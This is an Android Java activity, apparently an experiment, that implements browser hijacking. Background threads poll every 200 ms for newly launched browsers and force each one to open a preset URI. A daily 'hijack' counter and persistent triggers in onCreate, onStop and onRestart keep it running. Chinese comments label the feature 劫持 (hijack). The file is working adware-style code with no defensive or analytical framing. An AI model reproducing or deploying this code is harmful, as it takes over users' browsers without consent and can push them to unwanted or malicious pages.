package com.tang.study.companytest1;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import java.util.concurrent.RunnableFuture;

/**
 * Created by Tangshuiming99 on 2016/4/26.
 */
public class TestActivity extends Activity {
    private Handler handler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {

            Toast.makeText(TestActivity.this, (String)msg.obj, Toast.LENGTH_SHORT).show();
            return true;
        }
    });
    ActivityManager manager;
    Set<String> mSet;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_test);
        manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        mSet = new HashSet<String>();

        try {
            test3(20, MainActivity.URI);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        test3(20, MainActivity.URI);
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        test3(20, MainActivity.URI);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isFirst = false;
    }
    //缓存打开浏览器进程的集合
//    private List<String> mList = new ArrayList<String>();
//    private boolean isFirst;
    private void test5(final int maxTimes, final String jumpUri){
//		DataStorageStore.DataContainer container = DataStorageStore.timeout(this, TimeSpan.fromDay(1).getSpan());
        new Thread(new Runnable() {
            @Override
            public void run() {
                String pkgName;
                SharedPreferences sharedPreferences = getSharedPreferences(
                        SAVE_FILE_NAME, Context.MODE_PRIVATE);
                while(true){
                    //如果超过一天
                    long firstLaucherTime = sharedPreferences.getLong(FIRTST_LAUCHER_TIME, 0l);
                    if(((firstLaucherTime != 0) && (System.currentTimeMillis() - firstLaucherTime) > 24*60*60*1000)){
                        mList.clear();
                        sharedPreferences.edit().clear();
                        isFirst = false;
                    }
                    //如果达到每天最大的劫持次数
                    indexCount = sharedPreferences.getInt(INDEX_COUNT, 0);
                    Log.e("Cat", "indexCount:" + indexCount);
                    if(indexCount >= maxTimes){
                        sharedPreferences.edit().putInt(INDEX_COUNT, 0);//
                        break;//
                    }
                    pkgName = BrowsableUtil.isLaucherPro(TestActivity.this);
                    Log.e("Cat", "pkgName:" + pkgName);
                    //没有打开任何浏览器
                    if("".equals(pkgName) || pkgName == null){
                        if(mList.size() > 0){
                            isFirst = true;//
                        }
                        //清空缓存集合
                        mList.clear();
                        Log.e("Cat", "没有启动的可劫持浏览器进程");
                    }
                    //如果打开的浏览器进程，缓存集合内不存在
                    else{
                        //
                        if(!mList.contains(pkgName)){
                            //添加进缓存集合
                            mList.add(pkgName);
                            if(mList.size() == 1 && isFirst ==false){//第一次劫持
                                isFirst = true;
                                //缓存第一次劫持的时间
                                SharedPreferences.Editor e = sharedPreferences.edit();
                                e.putLong(FIRTST_LAUCHER_TIME, System.currentTimeMillis());
                                e.commit();
                            }
                            //劫持
                            Intent intent = new Intent(Intent.ACTION_VIEW);
                            intent.setPackage(pkgName);
                            intent.setData(android.net.Uri.parse(jumpUri));
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            Log.e("Cat", "劫持:" + pkgName);
                            TestActivity.this.startActivity(intent);
                            ++indexCount;//劫持成功，缓存劫持次数
                            SharedPreferences.Editor e = getEditor(SAVE_FILE_NAME);
                            e.putInt(INDEX_COUNT, indexCount);
                            e.commit();
                            Log.e("Cat", "缓存的劫持次数：" + indexCount + ",isFirst:" + isFirst);

                            Log.e("Cat", "firstLaucherTimer：" + sharedPreferences.getLong(FIRTST_LAUCHER_TIME, 0));

                        }else{//如果包含
                            List<String> list = BrowsableUtil.getLaucherPro(TestActivity.this);
                            if(mList.size() - list.size() > 0 && list.contains(pkgName)){
                                mList.remove(pkgName);
                            }

                        }
                    }
//                    mList = BrowsableUtil.getLaucherPro(TestActivity.this);
//					每次间隔200毫秒时循环，避免循环太过频繁
                    try {
                        Thread.sleep(200);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch(Exception e){
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }
    /**缓存劫持数据的文件名*/
    public static final String SAVE_FILE_NAME = "interceptDataFile";
    /**缓存第一次劫持的时间*/
    public static final String FIRTST_LAUCHER_TIME = "firstLauTime";
    /**缓存劫持的次数*/
    public static final String INDEX_COUNT = "indexCount";
    private List<String> mList = new ArrayList<String>();
    private boolean isFirst;
    private int indexCount;
    private static int count;

    private void test(final int maxTimes, final String jumpUri){
        new Thread(new Runnable() {
            @Override
            public void run() {
                String pkgName;
                SharedPreferences sharedPreferences = getSharedPreferences(
                        SAVE_FILE_NAME, Context.MODE_PRIVATE);
                while(true){
                    //如果超过一天
                    long firstLaucherTime = sharedPreferences.getLong(FIRTST_LAUCHER_TIME, 0l);
                    if(((firstLaucherTime != 0) && (System.currentTimeMillis() - firstLaucherTime) > 24*60*60*1000)){
                        mList.clear();
                        sharedPreferences.edit().clear();
                        isFirst = false;
                    }
                    //如果达到每天最大的劫持次数
                    indexCount = sharedPreferences.getInt(INDEX_COUNT, 0);
                    Log.e("Cat", "indexCount:" + indexCount);
                    if(indexCount >= maxTimes){
                        sharedPreferences.edit().putInt(INDEX_COUNT, 0);//
                        break;//
                    }
                    pkgName = BrowsableUtil.isLaucherPro(TestActivity.this);
                    Log.e("Cat", "pkgName:" + pkgName);
                    //没有打开任何浏览器
                    if("".equals(pkgName) || pkgName == null){
                        if(mList.size() > 0){
                            isFirst = true;//
                        }
                        //清空缓存集合
                        mList.clear();
                        Log.e("Cat", "没有启动的可劫持浏览器进程");
                    }
                    //如果打开的浏览器进程，缓存集合内不存在
                    else{
                        //
                        if(!mList.contains(pkgName)){
                            //添加进缓存集合
                            mList.add(pkgName);
                            if(mList.size() == 1 && isFirst ==false){//第一次劫持
                                isFirst = true;
                                //缓存第一次劫持的时间
                                SharedPreferences.Editor e = sharedPreferences.edit();
                                e.putLong(FIRTST_LAUCHER_TIME, System.currentTimeMillis());
                                e.commit();
                            }
                            count = BrowsableUtil.getLaucherPro(TestActivity.this).size();//
                            //劫持
                            Intent intent = new Intent(Intent.ACTION_VIEW);
                            intent.setPackage(pkgName);
                            intent.setData(android.net.Uri.parse(jumpUri));
//                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            Log.e("Cat", "劫持:" + pkgName);
                            TestActivity.this.startActivity(intent);
                            ++indexCount;//劫持成功，缓存劫持次数
                            SharedPreferences.Editor e = getEditor(SAVE_FILE_NAME);
                            e.putInt(INDEX_COUNT, indexCount);
                            e.commit();
                            Log.e("Cat", "缓存的劫持次数：" + indexCount + ",isFirst:" + isFirst);

                            Log.e("Cat", "firstLaucherTimer：" + sharedPreferences.getLong(FIRTST_LAUCHER_TIME, 0));

                        }else{//如果包含
                            List<String> list = BrowsableUtil.getLaucherPro(TestActivity.this);
                            for(String s : mList){

                                Log.e("Cat", "缓存集合数据mList：" + s);
                            }
                            for(String s : list){
                                Log.e("Cat", "运行集合数据list：" + s);
                            }

                            if(mList.size() - list.size() > 0 && list.contains(pkgName)){
//                                mList.remove(pkgName);
                            }

                        }
                    }
//					每次间隔200毫秒时循环，避免循环太过频繁
                    try {
                        Thread.sleep(200);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch(Exception e){
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }
    private SharedPreferences.Editor getEditor(String saveFile){
        SharedPreferences sharedPreferences = this.getSharedPreferences(saveFile, Context.MODE_PRIVATE);
        return sharedPreferences.edit();
    }
    private LinkedList<String> linkedList = new LinkedList<String>();
    private void test3(final int maxTimes, final String jumpUri){
        new Thread(new Runnable() {
            @Override
            public void run() {
                while(true){
                    try {
                        Thread.sleep(200);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    String pkgName = BrowsableUtil.isLaucherPro(TestActivity.this);

                    Set<String> set = BrowsableUtil.getLaucherPro2(TestActivity.this);

                    if("".equals(pkgName) || pkgName == null){
                        Log.e("info", "当前没有启动的浏览器");
                    }else{
                            String s = "";
                            List<String> li = new ArrayList<String>();

                            for(String se : set){
                                if(!mSet.contains(se)){
                                    li.add(se);
                                }
                            }

                        mSet = set;//
                            if(li.size() == 0){
                                continue;
                            }

                        s = li.get(0);
                            ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                            List<ActivityManager.RunningTaskInfo> l = manager.getRunningTasks(1);
                            if(l.size() > 0){
                                String name = l.get(0).topActivity.getPackageName();
                                Log.e("Cat", "name :" + name);
//                                if(pkgName.equals(name)){
                                    Intent intent = new Intent(Intent.ACTION_VIEW);
                                    if(!"".equals(s)){

                                        intent.setPackage(s);
                                    }
                                intent.setData(Uri.parse(jumpUri));
                                Log.e("Cat", "劫持" + s + ", pakName:" + pkgName);
                                    startActivity(intent);
//                                }
                            }
                        }

//                        ActivityManager manager;manager.getRunningTasks(1).get(0).topActivity.getPackageName();




                }
            }
        }).start();
    }
    private long firstLauTime;
    private boolean isLaucher;

    private void test2(final int maxTimes,final String jumpUri){
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<String> runningList = null;
                SharedPreferences sharedPreferences = TestActivity.this.getSharedPreferences(
                        SAVE_FILE_NAME, Context.MODE_PRIVATE);
                while(true){
                    firstLauTime = sharedPreferences.getLong("firstLauTime", 0);//每次获取缓存的第一次拦截的时间
                    Log.e("info", "firstLauTime:" + firstLauTime);
                    //如果时间超过1天，所有状态还原
                    if(firstLauTime != 0 && (System.currentTimeMillis() - firstLauTime) > 24*60*60*1000){//
                        isLaucher = false;
                        indexCount = 0;
                        getEditor(SAVE_FILE_NAME).clear();//清空缓存
                    }else {

                        if(indexCount >= maxTimes){
                            break;//如果达到最大拦截次数，结束循环
                        }

                        //获取到所有启动的浏览器
                        runningList = BrowsableUtil.getLaucherPro(TestActivity.this);
                        String pkgName = BrowsableUtil.isLaucherPro(TestActivity.this);
                        if (!(runningList == null || runningList.size() == 0)) {
                            for(String s : runningList){
//                                Log.e("info", "检测到启动的浏览器:" + s);
                            }
                            if("".equals(pkgName) || pkgName == null){
                                count = 0;
                            }else {
                                if (isLaucher && (runningList.size() - count) > 0) {//如果新启动浏览器
                                    count = runningList.size();
                                    isLaucher = true;
//                                    handler.obtainMessage(2, "检测到最新启动的浏览器：" + pkgName).sendToTarget();
                                    //跳转指定Ur
                                    Intent intent = new Intent(Intent.ACTION_VIEW);
                                    intent.setPackage(pkgName);
                                    intent.setData(Uri.parse(jumpUri));
                                    startActivity(intent);
                                    //记录拦截的次数
                                    indexCount++;
                                    Log.e("info", "indexCount:" + indexCount);
                                }
                                if (!isLaucher) {
                                    //
//                                indexCount = sharedPreferences.getInt("indexCount", 0);
                                    Log.e("info", "indexCont:" + indexCount);
                                    firstLauTime = System.currentTimeMillis();
                                    SharedPreferences.Editor editor = getEditor(SAVE_FILE_NAME);
                                    editor.putLong("firstLauTime", firstLauTime);//缓存第一次拦截的时间进本地
                                    editor.commit();
                                    //第一次启动
                                    count = runningList.size();
                                    isLaucher = true;
//                                    handler.obtainMessage(2, "检测到最新启动的浏览器：" + pkgName).sendToTarget();
                                    //跳转指定Url
                                    Intent intent = new Intent(Intent.ACTION_VIEW);
                                    intent.setPackage(pkgName);
                                    intent.setData(Uri.parse(jumpUri));
                                    startActivity(intent);
                                    //记录拦截的次数
                                    indexCount++;
                                }
                            }//

                        } else {
                            count = 0;
                            if (isLaucher) {
                                isLaucher = false;
                            }
                        }

                    }

                }//while
            }
        }).start();
    }
}
